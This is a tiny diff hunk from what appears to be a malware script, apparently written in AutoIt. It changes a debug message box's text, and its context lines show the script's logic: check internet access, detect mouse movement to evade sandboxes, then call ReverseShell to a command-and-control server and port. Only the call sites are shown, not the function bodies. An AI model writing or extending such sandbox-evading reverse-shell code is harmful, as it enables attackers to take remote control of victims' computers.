@@ -11,7 +11,7 @@ if InternetCheck() Then
 
    if DetectMouseMoving() Then
 
-	  MessageBox("Debug","Hi!")
+	  MessageBox("Debug","Hi!!!")
 
 	  ReverseShell($c2server, $c2port)
 
